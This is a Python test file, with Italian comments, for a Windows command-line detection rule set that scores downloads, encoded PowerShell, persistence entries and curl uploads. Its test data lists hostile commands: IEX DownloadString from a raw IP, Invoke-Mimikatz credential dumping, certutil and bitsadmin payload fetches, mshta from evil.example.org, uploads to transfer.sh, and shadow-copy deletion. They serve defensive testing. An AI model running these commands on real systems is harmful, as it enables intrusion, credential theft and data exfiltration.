# -*- coding: utf-8 -*-
# SPDX-License-Identifier: Apache-2.0
# Download dal sito di un produttore o da un indirizzo IP,
# comandi codificati giudicati per quello che fanno in chiaro, voci di avvio create da un comando,
# caricamenti con curl verso la rete interna.
import base64
import tc_regole as R, tc_eventi
rac = tc_eventi.Raccolta()
sb = [0]
def prova(nome, ottenuto, atteso):
    if ottenuto != atteso:
        sb[0] += 1
        print 'NO  %s: atteso %r, ottenuto %r' % (nome, atteso, ottenuto)

def enc(testo):
    return base64.b64encode(testo.encode('utf-16-le')).decode('ascii')

def eseguito(riga):
    """Il peso con cui la riga compare tra i comandi eseguiti (4688, Sysmon)."""
    eseguibile, arg = R.spezza_comando(riga)
    nome = R.con_estensione(R.nome_base(eseguibile))
    return max([0] + [x[0] for x in rac._giudica_processo(eseguibile, nome, riga)])

def persistente(riga):
    """Il peso in una voce che parte da sola (stessa formula di giudica_persistenza)."""
    g = R.valuta_comando(riga)
    peso = {3: 3, 2: 2, 1: 1}.get(g.livello, 0)
    peso = max([peso, R.strumento(g.nome)[0] if R.strumento(g.nome)[0] >= 2 else 0] + [x[0] for x in R.comandi_noti(riga)])
    return peso

# ---- download: (riga, livello di valuta_comando, peso da eseguito, peso in persistenza)
D = [
 (u'powershell.exe -Command "Invoke-WebRequest -Uri https://download.microsoft.com/setup.msi -OutFile C:\\Temp\\setup.msi"', 2, 0, 2),
 (u'powershell.exe -Command "Invoke-WebRequest -Uri https://evil.example.org/setup.msi -OutFile C:\\Temp\\setup.msi"', 3, 2, 3),
 (u'powershell.exe -Command "Invoke-WebRequest -Uri http://45.77.10.20/a.dat -OutFile C:\\Temp\\a.dat"', 3, 2, 3),
 (u'powershell.exe -Command "Invoke-WebRequest -Uri http://10.1.2.3/repo/dati.zip -OutFile D:\\Dati\\dati.zip"', 2, 0, 2),
 (u'powershell.exe -Command "Invoke-WebRequest -Uri https://download.microsoft.com/a.msi -OutFile a.msi; iwr https://evil.example.org/b.exe -OutFile b.exe"', 3, 2, 3),
 (u'msiexec.exe /i https://download.mozilla.org/firefox.msi /quiet', 1, 0, 1),
 (u'msiexec.exe /i https://sito.example.org/pacchetto.msi /quiet', 2, 2, 2),
 (u'msiexec /q /i http://1.2.3.4/a.msi', 3, 2, 3),
 (u'curl.exe -o C:\\Temp\\data.json https://api.internal.corp/export', 2, 0, 2),
 (u'curl.exe -o C:\\Users\\Public\\a.exe http://x/y', 3, 2, 3),
 (u'curl.exe -L -o C:\\Temp\\python.exe https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe', 2, 0, 2),
 (u'curl.exe -o C:\\Windows\\Temp\\x.dat http://45.77.10.20/p', 3, 2, 3),
 (u'curl.exe -s https://example.com/stato', 1, 0, 1),
 (u'certutil.exe -urlcache -split -f http://1.2.3.4/a.exe C:\\Users\\Public\\a.exe', 3, 2, 3),
 (u'certutil.exe -urlcache -f http://45.77.10.20/x.txt x.txt', 3, 2, 3),
 (u'certutil.exe -urlcache -f http://crl.example.org/ca.crl', 1, 0, 1),
 (u'bitsadmin /transfer j /download https://dl.google.com/chrome/install/ChromeSetup.exe C:\\Temp\\ChromeSetup.exe', 2, 0, 2),
 (u'bitsadmin /transfer j /download http://1.2.3.4/a.exe C:\\ProgramData\\a.exe', 3, 2, 3),
]
for riga, livello, e, p in D:
    g = R.valuta_comando(riga)
    prova('livello  ' + riga[:70].encode('utf-8'), g.livello, livello)
    prova('eseguito ' + riga[:70].encode('utf-8'), eseguito(riga), e)
    prova('persist. ' + riga[:70].encode('utf-8'), persistente(riga), p)

# ---- comandi codificati: (testo in chiaro, livello in persistenza, peso da eseguito, certo)
C = [
 (u'Get-Date', 2, 0, False),
 (u'Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name', 2, 0, False),
 (u'Get-WmiObject Win32_OperatingSystem | Select-Object Caption, Version', 2, 0, False),
 (u'(Get-Counter "\\Processor(_Total)\\% Processor Time").CounterSamples.CookedValue', 2, 0, False),
 (u'Start-Process C:\\Windows\\System32\\notepad.exe', 3, 2, False),
 (u'Get-ChildItem C:\\Logs | Remove-Item', 3, 2, False),
 (u'$x = Get-Content C:\\Users\\Public\\note.txt', 3, 2, False),
 (u'Set-ItemProperty -Path HKLM:\\Software\\App -Name Livello -Value 3', 3, 2, False),
 (u'Import-Module ActiveDirectory; Get-ADUser -Filter *', 3, 2, False),
 (u'[ScriptBlock]::Create($env:x).Invoke()', 3, 2, False),
 (u'IEX (New-Object Net.WebClient).DownloadString("http://1.2.3.4/a")', 3, 3, True),
 (u'Invoke-Mimikatz -DumpCreds', 3, 3, True),
 (u'Add-MpPreference -ExclusionPath C:\\Dati', 3, 2, False),
 (u'powershell -enc AAAAAAAAAAAAAAAAAAAAAAAAAAAA', 3, 2, False),
 (u'vssadmin delete shadows /all /quiet', 3, 2, False),
]
for chiaro, livello, e, certo in C:
    riga = u'powershell.exe -NoProfile -EncodedCommand ' + enc(chiaro)
    g = R.valuta_comando(riga)
    prova('codificato: livello  ' + chiaro[:50].encode('utf-8'), g.livello, livello)
    prova('codificato: certo    ' + chiaro[:50].encode('utf-8'), g.certo, certo)
    prova('codificato: in chiaro ' + chiaro[:50].encode('utf-8'), g.decodificato, chiaro)
    prova('codificato: eseguito ' + chiaro[:50].encode('utf-8'), eseguito(riga), e)
prova('codificato non decodificabile: livello 3', R.valuta_comando(u'powershell -enc ' + u'QUJD' * 12).livello, 3)
prova('FromBase64String senza -enc: livello 3', R.valuta_comando(u'powershell -c "[Convert]::FromBase64String($a)"').livello, 3)
prova('codificato lungo ma di sola lettura', R.valuta_comando(u'powershell -enc ' + enc(u'Get-Date; ' * 1000)).livello, 2)
prova('codice_che_agisce: oltre 20000 caratteri nel dubbio agisce', R.codice_che_agisce(u'Get-Date; ' * 2001), True)
for testo, atteso in ((u'Get-Date', False), (u'', True), (None, True), (u'Get-Process | Sort-Object CPU -Descending | Select-Object -First 5', False),
                      (u'whoami', False), (u'hostname', False), (u'Get-Process | Stop-Process', True), (u'& $x', True),
                      (u'& $env:ComSpec /c dir', True), (u'[Diagnostics.Process]::Start("calc")', True), (u'nltest /dclist:corp', True),
                      (u'Get-ADUser -Filter *', True), (u'([adsisearcher]"objectclass=user").FindAll()', True),
                      (u'[IO.File]::WriteAllBytes("a", $b)', True), (u'Get-Service -Name Spooler', False),
                      (u'cmd /c dir', True), (u'Get-Content \\\\srv\\share\\a.txt', False), (u'ping 10.0.0.1', False),
                      (u'http://x', True), (u'Write-Output "ok"', False)):
    prova('codice_che_agisce(%r)' % testo, R.codice_che_agisce(testo), atteso)

# ---- voci di avvio create da un comando: (riga, peso da eseguito, peso in persistenza, avvio)
A = [
 (u'schtasks /create /tn "Cleanup" /tr "cmd /c del C:\\Windows\\Temp\\*.tmp" /sc daily', 0, 0, False),      # pulizia dei temporanei
 (u'schtasks /create /tn "Cleanup" /tr "cmd /c del C:\\Windows\\Temp\\*.tmp & C:\\Windows\\Temp\\a" /sc daily', 2, 2, True),
 (u'schtasks /create /tn Upd /tr "C:\\Users\\Public\\u.exe" /sc onlogon /ru SYSTEM', 2, 2, True),
 (u'schtasks /create /tn Upd /tr "mshta https://evil.example.org/a.hta" /sc onlogon', 3, 3, True),
 (u'schtasks /create /tn Bk /tr "\\"C:\\Program Files\\Backup\\bk.exe\\" /full" /sc daily', 0, 0, False),
 (u'sc create Upd binPath= "C:\\Users\\Public\\u.exe" start= auto', 2, 2, True),
 (u'sc create Upd binPath= "C:\\Tools\\mimikatz.exe" start= auto', 3, 3, True),
 (u'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Upd /d C:\\PerfLogs\\u.exe /f', 2, 2, True),
 (u'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v App /d "C:\\Program Files\\App\\app.exe" /f', 0, 0, False),
]
for riga, e, p, avvio in A:
    g = R.valuta_comando(riga)
    prova('avvio: flag     ' + riga[:60].encode('utf-8'), g.avvio, avvio)
    prova('avvio: eseguito ' + riga[:60].encode('utf-8'), eseguito(riga), e)
    prova('avvio: persist. ' + riga[:60].encode('utf-8'), persistente(riga), p)
    r = R.riga_di_console(riga)
    prova('avvio: console  ' + riga[:60].encode('utf-8'), r[0] if r else 0, e)

# ---- curl che carica un file: conta dove va
for riga, atteso in (
    (u'curl.exe -X POST -F file=@C:\\Reports\\daily.csv https://intake.corp.local/upload', 0),
    (u'curl.exe -T C:\\bk\\db.zip ftp://10.0.0.9/bk/', 0),
    (u'curl.exe -F file=@C:\\r.csv http://fileserver/upload', 0),
    (u'curl.exe -F file=@C:\\Temp\\d.zip https://transfer.sh/', 2),
    (u'curl -T C:\\Temp\\d.zip ftp://45.77.10.20/ --user a:b', 2),
    (u'curl.exe -F file=@C:\\r.csv https://intake.corp.local/u https://esterno.example.org/u', 2),
    (u'curl.exe -T C:\\Temp\\d.zip ftp.esterno.example.org', 2),
    (u'rar.exe a -hpS3cret C:\\Temp\\d.rar D:\\Dati', 2)):
    prova('invio: ' + riga[:70].encode('utf-8'), max([0] + [x[0] for x in R.comandi_noti(riga)]), atteso)

# ---- funzioni di servizio
for nome, atteso in ((u'srv01', True), (u'intake.corp.local', True), (u'10.1.2.3', True), (u'192.168.1.5', True), (u'127.0.0.1', True),
                     (u'8.8.8.8', False), (u'example.org', False), (u'transfer.sh', False), (u'', False), (None, False),
                     (u'SRV01.LAN.', True), (u'a.b.internal', True)):
    prova('host_interno(%r)' % nome, R.host_interno(nome), atteso)
for testo, atteso in ((u'iwr https://download.microsoft.com/a.msi', True), (u'iwr https://download.microsoft.com.evil.org/a.msi', False),
                      (u'iwr https://evil.org/download.microsoft.com/a.msi', False), (u'nessun indirizzo', False), (u'', False), (None, False),
                      (u'iwr https://DOWNLOAD.MICROSOFT.COM/a.msi', True), (u'iwr https://utente@download.microsoft.com/a.msi', True),
                      (u'iwr https://download.microsoft.com@evil.org/a.msi', False), (u'iwr https://download.microsoft.com:8443/a.msi', True),
                      (u'iwr https://download.microsoft.com:80@evil.org/a.msi', False), (u'iwr https://a:b@download.microsoft.com/a.msi', True),
                      (u'iwr https://download.microsoft.com./a.msi', True), (u'iwr https://download.microsoft.com\\@evil.org/a.msi', False),
                      (u'iwr https://[2001:db8::1]/a.msi', False), (u'iwr https:///a.msi', False)):
    prova('solo_da_produttori(%r)' % testo, R.solo_da_produttori(testo), atteso)
for indirizzo, atteso in ((u'http://a.b/c', u'a.b'), (u'https://U:P@Host.Example.ORG:8443/x?y#z', u'host.example.org'), (u'ftp://a:b@45.77.10.20/', u'45.77.10.20'),
                          (u'http://[::1]:8080/a', u'[::1]'), (u'http://', u''), (u'non un indirizzo', u''), (None, u''), (u'http://a@b@c/d', u'c'),
                          (u'http://sito.buono:80@altro.sito/x', u'altro.sito'), (u'HTTP://A.B', u'a.b')):
    prova('host_di(%r)' % indirizzo, R.host_di(indirizzo), atteso)
prova('invio a un indirizzo pubblico con utente e password', max([0] + [x[0] for x in R.comandi_noti(u'curl -T C:\\d.zip ftp://a:b@45.77.10.20/')]), 2)
prova('invio a un indirizzo privato con utente e password', max([0] + [x[0] for x in R.comandi_noti(u'curl -T C:\\d.zip ftp://a:b@10.0.0.9/')]), 0)
# piu' comandi codificati nella stessa riga: contano tutti
due = u'cmd /c "powershell -enc ' + enc(u'Get-Date') + u' & powershell -enc ' + enc(u'IEX (New-Object Net.WebClient).DownloadString("http://1.2.3.4/a")') + u'"'
g = R.valuta_comando(due)
prova('due comandi codificati, il secondo d\'attacco: livello e certo', (g.livello, g.certo), (3, True))
prova('due comandi codificati: tutti e due in chiaro', u'Get-Date' in g.decodificato and u'DownloadString' in g.decodificato, True)
due = u'cmd /c "powershell -enc ' + enc(u'Get-Date') + u' & powershell -enc ' + enc(u'Get-Service') + u'"'
prova('due comandi codificati di sola lettura: livello 2', R.valuta_comando(due).livello, 2)
due = u'cmd /c "powershell -enc ' + enc(u'Get-Date') + u' & powershell -enc ' + u'QUJD' * 12 + u'"'
prova('due comandi codificati, il secondo non decodificabile: livello 3', R.valuta_comando(due).livello, 3)
prova('una chiamata a un indirizzo IP pubblico senza salvare nulla: livello 2',
      R.valuta_comando(u'powershell -c "Invoke-RestMethod http://45.77.10.20:8080/health"').livello, 2)
# la sola creazione di una copia shadow e' contesto
prova('vssadmin create shadow: informativo', [x[0] for x in R.comandi_noti(u'vssadmin create shadow /for=C:')], [1])
prova('wmic shadowcopy call create: informativo', [x[0] for x in R.comandi_noti(u'wmic shadowcopy call create Volume=C:\\')], [1])
print 'regole riviste: prove fallite %d' % sb[0]
